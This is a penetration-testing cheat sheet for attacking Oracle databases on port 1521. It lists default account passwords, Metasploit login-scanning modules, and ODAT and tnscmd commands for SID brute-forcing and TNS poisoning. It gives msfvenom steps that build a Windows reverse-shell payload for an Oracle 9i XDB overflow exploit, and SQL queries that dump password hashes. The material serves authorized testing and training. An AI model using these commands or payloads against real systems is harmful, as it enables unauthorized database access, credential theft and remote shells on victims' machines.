# 1521 - Oracle

> At the creation of the database a lot of users with default password are created, but in the earlier version (11.\*, 12.\*) most of the default account are locked or see their password change by the user at the installation.\
> Nevertheless on older version (9.\*) the defaults accounts will not be locked by default and will keep their default password.

* **Generic** : `dbeaver -h`
* **sqlplus** `sqlplus <USERNAME>/<PASSWORD>@<TARGET>`. You can list the tables through `SELECT OWNER, TABLE_NAME FROM DBA_TABLES;`, list all the users through `SELECT USERNAME, USER_ID FROM ALL_USERS;`.\\
* **metasploit plugins** :
  * `auxiliary/admin/oracle/oracle_sql`
  * `auxiliary/scanner/oracle/oracle_login`

|   Username  |   Default password   |
| :---------: | :------------------: |
|    SYSTEM   |        MANAGER       |
|     SYS     | CHANGE\_ON\_ INSTALL |
|    SYSMAN   |          n/a         |
|  ANONYMOUS  |       ANONYMOUS      |
|    CTXSYS   |        CTXSYS        |
|    DBSNMP   |        DBSNMP        |
|   LBACSYS   |        LBACSYS       |
|    MDSYS    |         MDSYS        |
|   OLAPSYS   |        MANAGER       |
|  ORDPLUGINS |      ORDPLUGINS      |
|    ORDSYS   |        ORDSYS        |
|    OUTLN    |         OUTLN        |
|    SCOTT    |         TIGER        |
|    WKSYS    |         WKSYS        |
|    WMSYS    |         WMSYS        |
|     XDB     |  CHANGE\_ON\_INSTALL |
| ORACLE\_OCM |      ORACLE\_OCM     |
|  ORDPLUGINS |      ORDPLUGINS      |

****

**Oracle TNS Listener**

* `tnscmd10g ping -h <IP>`
* `tnscmd10g version -h <IP>`
* `tnscmd10g status -h <IP>`
* `tnscmd10g services -h <IP>`
* Brute-force the SID : `sidguess -i <IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt`
* ODAT [Oracle Database Attacking Tool](https://github.com/quentinhardy/odat)
  * Releases : [https://github.com/quentinhardy/odat/releases/](https://github.com/quentinhardy/odat/releases/)
  * Wiki : [https://github.com/quentinhardy/odat/wiki](https://github.com/quentinhardy/odat/wiki)
    * `./odat-libc2.5-i686 tnscmd -s <IP> -p 1521 --version`
    * `./odat-libc2.5-i686 tnscmd -s <IP> -p 1521 --status`
    * `./odat-libc2.5-i686 tnspoison -s <IP> -p 1521 -d <SID> --test-module`
    * `./odat-libc2.5-i686 sidguesser -s <IP> --sids-file=/mnt/hgfs/OSCP/Lab/Tools/odat/sids.txt`

**Oracle XML DB**

* [Exploit Oracle XDB 9i Windows](https://github.com/6odhi/Python-Exploit-for-Oracle-9i-XDB-Windows-x86---HTTP-PASS-Overflow-Metasploit-/blob/master/xdbHttpExpoit.py)
  * Generate payload : `msfvenom -p windows/shell_reverse_tcp LHOST=<LOCAL-IP> LPORT=<LPORT> EXITFUN=thread --platform windows -a x86 --smallest -f python -v shellCode -b '\x00'`
  * Update the following line : `connect=s.connect(('<IP>', <RPORT>))`
  * Run the payload : `python xdbHttpExpoit.py`



To dump passwords:

* Oracle 10g R2: \`SELECT username, password FROM dba\_users WHERE username=‘\<username>’;\`
* Oracle 11g R1: \`SELECT name, password, spare4 FROM sys.user$ WHERE name=‘\<username>’;\`
